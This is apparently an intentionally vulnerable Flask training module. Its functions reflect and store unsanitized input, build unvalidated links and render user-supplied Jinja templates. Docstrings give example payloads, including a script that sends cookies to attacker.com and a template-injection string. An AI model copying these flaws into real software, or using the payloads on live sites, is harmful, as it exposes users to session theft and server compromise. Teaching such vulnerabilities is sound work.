"""
Intentionally vulnerable XSS implementations for demonstrating Cross-Site Scripting vulnerabilities.

WARNING: This code contains intentional security vulnerabilities for educational purposes.
DO NOT use these functions in a production environment or with sensitive data.
"""
import sqlite3
import os
import json
from datetime import datetime
from flask import current_app, render_template_string


def get_db_connection():
    """
    Create a SQLite database connection for educational demonstrations.
    
    Returns:
        SQLite database connection object
    """
    db_path = os.path.join(current_app.config['INSTANCE_PATH'], 'xss_demo.db')
    conn = sqlite3.connect(db_path)
    conn.row_factory = sqlite3.Row
    return conn


def setup_demo_db():
    """
    Initialize the demo database with sample data for XSS exercises.
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Create tables
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS comments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        content TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        post_id INTEGER
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_profiles (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL,
        bio TEXT,
        website TEXT,
        avatar_url TEXT
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS search_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        query TEXT NOT NULL,
        user_id INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Insert sample data
    cursor.execute("DELETE FROM comments")
    cursor.execute("DELETE FROM user_profiles")
    cursor.execute("DELETE FROM search_history")
    
    # Sample comments
    sample_comments = [
        ('john_doe', 'Great article! Very informative.', 1),
        ('alice123', 'I have a question about this topic.', 1),
        ('security_fan', 'Be careful about using innerHTML without sanitization!', 1),
        ('dev_user', 'Check out my website: https://example.com', 2),
        ('bob', 'Looking forward to more content like this.', 2)
    ]
    cursor.executemany(
        "INSERT INTO comments (username, content, post_id) VALUES (?, ?, ?)",
        sample_comments
    )
    
    # Sample user profiles
    sample_profiles = [
        ('john_doe', 'Web developer with 5 years experience', 'https://johndoe.com', 'https://example.com/avatar1.png'),
        ('alice123', 'Cybersecurity enthusiast', 'https://alice.blog', 'https://example.com/avatar2.png'),
        ('security_fan', 'I love finding security vulnerabilities', 'https://security.blog', 'https://example.com/avatar3.png'),
        ('dev_user', 'Full-stack developer', 'https://devuser.com', 'https://example.com/avatar4.png'),
        ('bob', 'Just a regular user', '', 'https://example.com/avatar5.png')
    ]
    cursor.executemany(
        "INSERT INTO user_profiles (username, bio, website, avatar_url) VALUES (?, ?, ?, ?)",
        sample_profiles
    )
    
    # Sample search queries
    sample_searches = [
        ('security tips', 1),
        ('xss prevention', 1),
        ('javascript tutorial', 2),
        ('sql injection', 3),
        ('web security', 4)
    ]
    cursor.executemany(
        "INSERT INTO search_history (query, user_id) VALUES (?, ?)",
        sample_searches
    )
    
    conn.commit()
    conn.close()


# =========== Vulnerable Functions ===========

def vulnerable_reflect_search_term(search_term):
    """
    VULNERABLE: Reflected XSS vulnerability in search functionality.
    
    Args:
        search_term (str): Search term from user input
        
    Returns:
        dict: Search results with vulnerable reflected output
        
    Example exploitation:
        search_term: <script>alert('XSS')</script>
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Log search query (for demonstration purposes)
    cursor.execute(
        "INSERT INTO search_history (query, user_id) VALUES (?, ?)",
        (search_term, 1)
    )
    conn.commit()
    
    # Vulnerable: Directly reflecting user input without sanitization
    # The search_term will be inserted directly into the HTML response
    
    # Perform search (for demonstration purposes)
    cursor.execute(
        "SELECT * FROM comments WHERE content LIKE ?",
        (f'%{search_term}%',)
    )
    results = cursor.fetchall()
    conn.close()
    
    # Return search results and the vulnerable reflected term
    return {
        'query': search_term,
        'count': len(results),
        'results': [dict(r) for r in results],
        'html_snippet': f"<div>You searched for: {search_term}</div>"
    }


def vulnerable_store_comment(username, content, post_id=1):
    """
    VULNERABLE: Stored XSS vulnerability in comment submission.
    
    Args:
        username (str): Username of commenter
        content (str): Comment content (potentially malicious)
        post_id (int): ID of the post being commented on
        
    Returns:
        dict: Stored comment data
        
    Example exploitation:
        content: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Vulnerable: Storing unsanitized user input in the database
    cursor.execute(
        "INSERT INTO comments (username, content, post_id) VALUES (?, ?, ?)",
        (username, content, post_id)
    )
    conn.commit()
    
    # Get the inserted comment
    comment_id = cursor.lastrowid
    cursor.execute("SELECT * FROM comments WHERE id = ?", (comment_id,))
    comment = cursor.fetchone()
    conn.close()
    
    # Vulnerable: The content will be rendered without sanitization when retrieved
    return dict(comment) if comment else None


def vulnerable_get_comments(post_id=1):
    """
    VULNERABLE: Retrieve comments with stored XSS payload.
    
    Args:
        post_id (int): ID of the post to get comments for
        
    Returns:
        list: Comments with potentially malicious content
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    cursor.execute("SELECT * FROM comments WHERE post_id = ? ORDER BY created_at DESC", (post_id,))
    comments = cursor.fetchall()
    conn.close()
    
    # The dangerous part is when these are rendered in templates without escaping
    return [dict(comment) for comment in comments]


def vulnerable_profile_page(username):
    """
    VULNERABLE: DOM-based XSS in user profile page through direct HTML manipulation.
    
    Args:
        username (str): Username to look up
        
    Returns:
        dict: Profile data with vulnerable HTML template
    """
    conn = get_db_connection()
    cursor = conn.cursor()
    
    # Get the user profile
    cursor.execute("SELECT * FROM user_profiles WHERE username = ?", (username,))
    profile = cursor.fetchone()
    conn.close()
    
    if not profile:
        return {'error': 'Profile not found'}
    
    profile_dict = dict(profile)
    
    # Vulnerable: Template includes unescaped user input
    template = """
        <div class="profile">
            <h2>{{ username }}'s Profile</h2>
            <div class="avatar">
                <img src="{{ avatar_url }}" alt="Profile Picture">
            </div>
            <div class="bio">
                <h3>Bio</h3>
                <p>{{ bio }}</p>
            </div>
            <div class="website">
                <h3>Website</h3>
                <a href="{{ website }}">{{ website }}</a>
            </div>
        </div>
    """
    
    # Vulnerable: Render template with unescaped user data
    profile_dict['html'] = render_template_string(template, **profile_dict)
    
    return profile_dict


def vulnerable_url_parsing(url_param):
    """
    VULNERABLE: XSS through URL parameter parsing.
    
    Args:
        url_param (str): URL parameter from request
        
    Returns:
        dict: Processed URL data
        
    Example exploitation:
        url_param: javascript:alert('XSS')
    """
    # Vulnerable: No validation of URL scheme
    return {
        'original_url': url_param,
        'processed': True,
        'html_link': f'<a href="{url_param}">Click here</a>'
    }


def vulnerable_json_handling(json_input):
    """
    VULNERABLE: XSS through improper JSON handling.
    
    Args:
        json_input (str): JSON string from user input
        
    Returns:
        dict: Processed JSON data
        
    Example exploitation:
        json_input: {"name":"<img src=x onerror=alert('XSS')>"}
    """
    try:
        # Parse the JSON
        data = json.loads(json_input)
        
        # Vulnerable: Using user-supplied values directly in HTML
        result = {
            'processed': True,
            'data': data,
            'html_output': f"<div>Welcome, {data.get('name', 'Guest')}!</div>"
        }
        return result
    except Exception as e:
        return {'error': str(e)}


def vulnerable_template_injection(template_data):
    """
    VULNERABLE: Server-side template injection.
    
    Args:
        template_data (dict): Template data including user-controlled template string
        
    Returns:
        dict: Rendered template
        
    Example exploitation:
        template_data: {"template": "{{ ''.__class__.__mro__[1].__subclasses__() }}"}
    """
    try:
        # Vulnerable: Rendering user-controlled template string
        template_string = template_data.get('template', "Hello, {{ name }}!")
        context = {
            'name': template_data.get('name', 'Guest'),
            'current_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        rendered = render_template_string(template_string, **context)
        
        return {
            'rendered': rendered,
            'context': context
        }
    except Exception as e:
        return {'error': str(e)}
